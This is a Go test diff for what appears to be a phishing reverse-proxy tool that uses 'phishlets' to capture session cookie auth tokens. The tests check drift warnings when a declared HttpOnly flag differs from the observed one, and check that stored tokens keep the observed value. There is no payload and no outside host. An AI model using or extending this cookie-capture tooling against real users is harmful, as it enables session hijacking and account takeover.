@@ -1,6 +1,7 @@
 package core
 
 import (
+	"bytes"
 	"crypto/rc4"
 	"encoding/base64"
 	"io"
@@ -11,8 +12,10 @@ import (
 	"strings"
 	"sync"
 	"testing"
+	"time"
 
 	"github.com/s4l1hs/olta/pkg/proxy/database"
+	"github.com/s4l1hs/olta/pkg/proxy/log"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/jsinspect"
 )
@@ -960,4 +963,131 @@ func TestConfigureJSInspect(t *testing.T) {
 			t.Fatal("jsInspector must remain nil after a failed configuration")
 		}
 	})
+}
+
+// TestCheckCookieHttpOnlyDrift covers the phishlet-drift signal wired at the
+// cookie-auth-token capture site in http_proxy.go: the declared http_only
+// modifier is only ever compared against the observed Set-Cookie HttpOnly
+// flag to log a drift warning - it must never be used to decide what gets
+// captured or stored.
+func TestCheckCookieHttpOnlyDrift(t *testing.T) {
+	newPhishlet := func(t *testing.T, tok string) *Phishlet {
+		t.Helper()
+		p := &Phishlet{}
+		p.Clear()
+		if err := p.addCookieAuthTokens("example.com", []string{tok}); err != nil {
+			t.Fatalf("addCookieAuthTokens: %v", err)
+		}
+		return p
+	}
+
+	captureLog := func(t *testing.T, fn func()) string {
+		t.Helper()
+		orig := log.GetOutput()
+		var buf bytes.Buffer
+		log.SetOutput(&buf)
+		defer log.SetOutput(orig)
+		fn()
+		return buf.String()
+	}
+
+	t.Run("declared http_only but observed cookie is not HttpOnly logs drift", func(t *testing.T) {
+		pl := newPhishlet(t, "sess:http_only")
+		out := captureLog(t, func() {
+			checkCookieHttpOnlyDrift(pl, "example.com", "sess", false)
+		})
+		if !strings.Contains(out, "phishlet drift") {
+			t.Errorf("expected a phishlet drift warning, got: %q", out)
+		}
+		if !strings.Contains(out, "declared=true") || !strings.Contains(out, "observed=false") {
+			t.Errorf("drift log missing declared/observed values: %q", out)
+		}
+	})
+
+	t.Run("declared and observed agree produces no drift log", func(t *testing.T) {
+		pl := newPhishlet(t, "sess:http_only")
+		out := captureLog(t, func() {
+			checkCookieHttpOnlyDrift(pl, "example.com", "sess", true)
+		})
+		if strings.Contains(out, "phishlet drift") {
+			t.Errorf("did not expect a drift warning when declared and observed agree, got: %q", out)
+		}
+	})
+
+	t.Run("no declaration and observed cookie not HttpOnly agree produces no drift log", func(t *testing.T) {
+		pl := newPhishlet(t, "sid") // no :http_only modifier -> declared defaults to false
+		out := captureLog(t, func() {
+			checkCookieHttpOnlyDrift(pl, "example.com", "sid", false)
+		})
+		if strings.Contains(out, "phishlet drift") {
+			t.Errorf("did not expect a drift warning, got: %q", out)
+		}
+	})
+
+	t.Run("no declaration but observed cookie is HttpOnly logs drift", func(t *testing.T) {
+		pl := newPhishlet(t, "sid")
+		out := captureLog(t, func() {
+			checkCookieHttpOnlyDrift(pl, "example.com", "sid", true)
+		})
+		if !strings.Contains(out, "phishlet drift") {
+			t.Errorf("expected a phishlet drift warning, got: %q", out)
+		}
+	})
+
+	t.Run("nil phishlet is a no-op", func(t *testing.T) {
+		out := captureLog(t, func() {
+			checkCookieHttpOnlyDrift(nil, "example.com", "sid", true)
+		})
+		if out != "" {
+			t.Errorf("expected no log output for a nil phishlet, got: %q", out)
+		}
+	})
+}
+
+// TestCookieAuthTokenCapture_StoredHttpOnlyMatchesObserved is the hard
+// constraint from the http_only drift feature: whatever the phishlet
+// declares, the HttpOnly value actually stored on the session's captured
+// cookie token must always equal the value observed on the origin's
+// Set-Cookie header - never the phishlet's declared value. This exercises
+// the same sequence the response pipeline runs (drift check, then capture)
+// for both an agreeing and a drifted phishlet declaration.
+func TestCookieAuthTokenCapture_StoredHttpOnlyMatchesObserved(t *testing.T) {
+	cases := []struct {
+		name             string
+		declaredModifier string // token modifier suffix, e.g. ":http_only" or ""
+		observedHttpOnly bool
+	}{
+		{"declared http_only, observed not HttpOnly (drift)", ":http_only", false},
+		{"declared http_only, observed HttpOnly (agree)", ":http_only", true},
+		{"not declared, observed HttpOnly (drift)", "", true},
+		{"not declared, observed not HttpOnly (agree)", "", false},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			pl := &Phishlet{}
+			pl.Clear()
+			if err := pl.addCookieAuthTokens("example.com", []string{"sess" + tc.declaredModifier}); err != nil {
+				t.Fatalf("addCookieAuthTokens: %v", err)
+			}
+
+			s, err := NewSession("test")
+			if err != nil {
+				t.Fatalf("NewSession: %v", err)
+			}
+
+			// Run the drift check exactly as the response pipeline does -
+			// it must not influence what gets captured.
+			checkCookieHttpOnlyDrift(pl, "example.com", "sess", tc.observedHttpOnly)
+			s.AddCookieAuthToken("example.com", "sess", "value123", "/", tc.observedHttpOnly, time.Time{})
+
+			stored, ok := s.CookieTokens["example.com"]["sess"]
+			if !ok {
+				t.Fatalf("cookie token was not captured")
+			}
+			if stored.HttpOnly != tc.observedHttpOnly {
+				t.Errorf("stored HttpOnly = %v, want %v (the observed value, regardless of the declared %q)", stored.HttpOnly, tc.observedHttpOnly, tc.declaredModifier)
+			}
+		})
+	}
 }
